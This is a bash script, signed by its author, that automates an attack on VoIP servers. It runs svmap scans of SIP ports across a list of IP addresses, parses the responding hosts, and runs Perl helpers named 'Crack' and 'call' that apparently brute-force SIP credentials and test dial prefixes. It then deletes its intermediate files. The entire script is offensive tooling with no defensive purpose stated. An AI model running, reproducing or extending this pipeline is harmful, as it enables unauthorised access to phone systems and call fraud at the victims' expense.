#!/bin/bash

# SIP scan

echo -e "\nStart SIP scan ...\n"

while read -r ip; do
	echo "Checking $ip";
	sudo python svmap.py -v -p5060,6072,6073,7073,6069,6079,6099,6089,5059,5260,5061,5070,5069,6655,5038,5080,5062,15060,6050,6051,5063,5064,5065,5067,5068,5071,5072,5073,5076,5075,5077,5078,1020,5079,1021,1022,1023,6052,6053,6054,6055,6057,6058,6059,6061,6062,6063,6070,6064,6080,6010,5090,5566,9060,4002,5678,5088,6020,5600,5160,1025,9090,5506,6060 -t0.0 >> output.txt
done < ip.txt

grep -Po "(\d+\.){3}\d+:?(\d?){7}" output.txt >>1
grep -R ':' 1 >2
awk '!a[$0]++' 2 >IPS
sudo rm 1
sudo rm 2
echo -e "\nEnding scan !\n"
sleep 1

# SIP Responses

echo -e "\nStart SIP Responses ...\n"

perl run IPS
cat 401.pal 403.pal 404.pal >> ipSIP
sleep 3

echo -e "\nEnding SIP Responses !\n"

# SIP Crack

echo -e "\nStart SIP Crack ...\n"

perl Crack 2000 2 ipSIP
sudo rm IPS # remove the file
sudo rm *.pal # remove the file
sudo rm ipSIP # remove the file
sleep 3
echo -e "\nEnding SIP crack !\n"

# Testing SIP prefix

echo -e "\nStart Testing ...\n"

perl call VOIPresult 500 20
sleep 5

echo -e "\nEnding crack !\n"
echo -e "\nby Mohammad Elnwajha\n"
